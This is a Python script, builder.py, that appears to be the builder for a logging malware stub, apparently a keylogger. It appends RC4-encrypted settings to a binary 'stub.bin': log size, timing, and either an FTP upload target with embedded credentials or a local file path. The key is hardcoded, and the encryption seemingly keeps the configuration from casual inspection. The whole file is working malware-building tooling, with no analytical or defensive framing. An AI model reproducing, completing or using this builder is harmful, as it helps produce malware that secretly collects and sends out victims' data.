import binascii
import sys
from urllib.parse import urlparse

class RC4:

    def __init__(self, key, streaming=True):
        assert(isinstance(key, (bytes, bytearray)))

        # key scheduling
        S = list(range(0x100))
        j = 0
        for i in range(0x100):
            j = (S[i] + key[i % len(key)] + j) & 0xff
            S[i], S[j] = S[j], S[i]
        self.S = S

        if streaming:
            self.keystream = self._keystream_generator()
        else:
            self.keystream = None

    def crypt(self, data):
        assert(isinstance(data, (bytes, bytearray)))
        keystream = self.keystream or self._keystream_generator()
        return bytes([a ^ b for a, b in zip(data, keystream)])

    def _keystream_generator(self):
        S = self.S.copy()
        x = y = 0
        while True:
            x = (x + 1) & 0xff
            y = (S[x] + y) & 0xff
            S[x], S[y] = S[y], S[x]
            i = (S[x] + S[y]) & 0xff
            yield S[i]

def make_solid_settings_blob(file_len, time_s, way):
     return file_len.to_bytes(4, byteorder='little')+time_s.to_bytes(4, byteorder='little')+way.to_bytes(1, byteorder='little')

def main():
    if len(sys.argv) != 6:
        print("builder.py log_size time ftp|file option result_file")
        print("ftp option ftp://user:pass@domain:port/")
        print("file option allow enviroment variables")
        return
    try:
        log_size_bytes = int(sys.argv[1])
    except:
        print("Argument #1 must contain positive integer value")
        return
    try:
        time_seconds = int(sys.argv[2])
    except:
        print("Argument #2 must contain positive integer value")
        return
    way = sys.argv[3]
    if (way not in ("file","ftp")):
        print("Argument #3 must contain 'ftp' or 'file' values")
        return
    option = sys.argv[4]
    w = 0
    optional_settings = 0
    if way == 'ftp':
        w = 2
        o = urlparse(option)
        if o.scheme != "ftp":
            print("Argument #4 must have 'ftp' scheme in url")
            return
        ftp_user = o.username
        if not ftp_user:
            ftp_user = ""
        ftp_pass = o.password
        if not ftp_pass:
            ftp_pass = ""
        ftp_port = o.port
        if not ftp_port:
            ftp_port = 21
        ftp_host = o.hostname
        optional_settings = (int(ftp_port)).to_bytes(2, byteorder='little')+ftp_host.encode('utf-8')+b'\x00'+ftp_user.encode('utf-8')+b'\x00'+ftp_pass.encode('utf-8')+b'\x00'
    elif way == 'file':
        w = 1
        optional_settings = option.encode('utf-16le')
    stub = open('stub.bin','rb')
    stub_content = stub.read()
    stub.close()
    settings = log_size_bytes.to_bytes(4, byteorder='little')+time_seconds.to_bytes(4, byteorder='little')+w.to_bytes(1, byteorder='little')+optional_settings
    cipher = RC4(b"N0Ss1oB", streaming=True)    
    enc_settings = cipher.crypt(settings)
    res = binascii.crc32(enc_settings).to_bytes(4, byteorder='little')+enc_settings
    rfile = open(sys.argv[5],'wb')
    rfile.write(stub_content)
    rfile.write(res)
    rfile.close()
if __name__ == "__main__":
    main()